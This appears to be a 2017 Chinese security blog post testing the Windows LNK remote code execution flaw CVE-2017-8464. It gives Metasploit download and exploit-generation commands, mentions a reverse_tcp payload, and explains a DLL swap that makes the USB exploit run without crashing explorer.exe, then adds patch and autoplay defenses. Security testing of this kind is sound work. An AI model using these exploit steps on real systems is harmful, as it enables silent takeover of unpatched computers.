<article class="post">
  <h1>Windows Lnk远程代码执行漏洞(CVE-2017-8464)利用测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>北京时间6月14日凌晨，微软发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。</p>

<p>该漏洞的原理同2010年据称美国和以色列入侵并破坏伊朗核设施的震网行动中所使用的震网病毒（Stuxnet）非常相似，所以也被一些人称为“震网三代”。</p>

<p>然而，通过百度搜索关键词“cve-2017-8464复现”找到的国内一些文章，对该漏洞的复现存在误解，错把通过快捷方式执行powershell代码当作了该漏洞的利用方法。</p>

<p>所以，本文将要纠正这个错误。</p>

<p>并且，目前可供测试的msf利用脚本存在一个bug，漏洞触发后进程explorer.exe崩溃，漏洞利用不够完美。</p>

<p>考虑到距补丁公开日期已经超过45天，所以本文将要公开利用脚本中bug的修复方法，实现该漏洞的“完美利用”。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>漏洞简介</li>
  <li>漏洞测试</li>
  <li>bug修复</li>
  <li>防御</li>
</ul>

<h2 id="0x02-漏洞简介">0x02 漏洞简介</h2>
<hr>

<p>该漏洞是一个微软Windows系统处理LNK文件过程中发生的远程代码执行漏洞。
当存在漏洞的电脑被插上存在病毒木马的U盘时，不需要任何额外操作，漏洞攻击程序就可以借此完全控制用户的电脑系统。
该漏洞也可能籍由用户访问网络共享、从互联网下载、拷贝文件等操作被触发和利用攻击。</p>

<p>也就是说，漏洞可以在以下任一条件下触发：</p>

<p>1、系统开启U盘自动播放功能，插入U盘，漏洞触发
2、通过网络共享访问该文件目录
3、直接访问该文件目录</p>

<h2 id="0x03-漏洞测试">0x03 漏洞测试</h2>
<hr>

<p>目前公开渠道可供测试利用的脚本有如下两个：</p>

<p><strong>1、msf利用脚本</strong></p>

<p>作者：ykoster</p>

<p>下载地址：https://github.com/rapid7/metasploit-framework/pull/8767</p>

<p><strong>2、python利用脚本</strong></p>

<p>作者：nixawk</p>

<p>下载地址：https://github.com/nixawk/labs/blob/master/CVE-2017-8464/exploit_CVE-2017-8464.py</p>

<p>本文着重测试msf脚本，将exp拷贝至U盘，测试通过U盘触发漏洞的利用方法</p>

<h3 id="实际测试">实际测试：</h3>

<p>测试系统： kali 2.0</p>

<p><strong>1、下载msf脚本</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb
</code></pre></div></div>

<p><strong>2、生成exp</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploits/windows/fileformat/cve_2017_8464_lnk_rce
set payload windows/x64/exec
set cmd calc.exe
set EXITFUNC thread
exploit
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>msf脚本默认对应系统Windows x64，所以payload也选择64位的exec</p>

<p>参数设置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-1.png" alt="Alt text"></p>

<p>执行后，在/root/.msf4/local/生成24个利用文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-2.png" alt="Alt text"></p>

<p>kali2.0下无法直接访问该文件夹，可通过命令行将<code class="language-plaintext highlighter-rouge">/root/.msf4/local/</code>下的所有文件复制到<code class="language-plaintext highlighter-rouge">/root/1</code>下</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">cp -r /root/.msf4/local/ /root/1</code></p>

<p>复制文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-3.png" alt="Alt text"></p>

<p>将以上文件复制到U盘，在另一未打补丁的Win7 x64系统测试</p>

<p><strong>3、测试</strong></p>

<p>成功执行calc.exe，但是进程explorer.exe崩溃</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>U盘内的利用脚本可通过格式化U盘删除</p>

<p>接着又分别做了如下测试：</p>

<ul>
  <li>测试Win10 x64</li>
  <li>更换payload： set payload windows/x64/meterpreter/reverse_tcp</li>
</ul>

<p>依旧是同样的结果</p>

<p>查看github，其他人也遇到了同样的问题，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-5.png" alt="Alt text"></p>

<p>更多回复见：https://github.com/rapid7/metasploit-framework/pull/8767</p>

<p><strong>4、更多测试</strong></p>

<p>尝试测试32位系统</p>

<p>该脚本支持32位系统，切换命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set target 1
set payload windows/exec
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-6.png" alt="Alt text"></p>

<p>但是测试结果不尽人意，依旧失败</p>

<h2 id="0x04-bug修复">0x04 bug修复</h2>
<hr>

<p>省略调试过程，直接给出一种最简单的解决方法：<strong>更换dll</strong></p>

<p>msf利用脚本共生成24个文件，分别为1个dll文件和23个lnk文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/3-1.png" alt="Alt text"></p>

<p>注：</p>

<p>对于23个lnk文件，文件名最后一位代表U盘盘符，如果测试系统U盘为E盘，那么只留下文件名最后一位为”E”的lnk文件就好，其他lnk文件可以删除</p>

<p>bug产生的原因在于dll，将其换成自己的dll就好</p>

<p>32位可供测试的dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calc.dll</p>

<p>64位可供测试的dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calc_x64.dll</p>

<p>不会导致进程explorer.exe崩溃，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/3-2.png" alt="Alt text"></p>

<p>插入U盘自动播放触发漏洞的测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/3-3.gif" alt="Alt text"></p>

<p>至此，bug成功修复</p>

<p>测试EXP地址：</p>

<p>https://github.com/3gstudent/CVE-2017-8464-EXP</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<h3 id="1安装补丁">1、安装补丁</h3>

<p>微软官方补丁下载地址：</p>

<p>https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8464</p>

<p>360漏洞补丁修复工具下载地址：</p>

<p>http://b.360.cn/other/stuxnet3fixtool</p>

<h3 id="2关闭u盘自动播放功能">2、关闭U盘自动播放功能</h3>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对CVE-2017-8464的msf利用脚本进行测试，修复其中的bug，在技术层面上，实现对该漏洞的“完美利用”，请勿用于非法用途，在此再次提醒普通用户勤打补丁的必要。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August  1, 2017
  </div>

  
</article>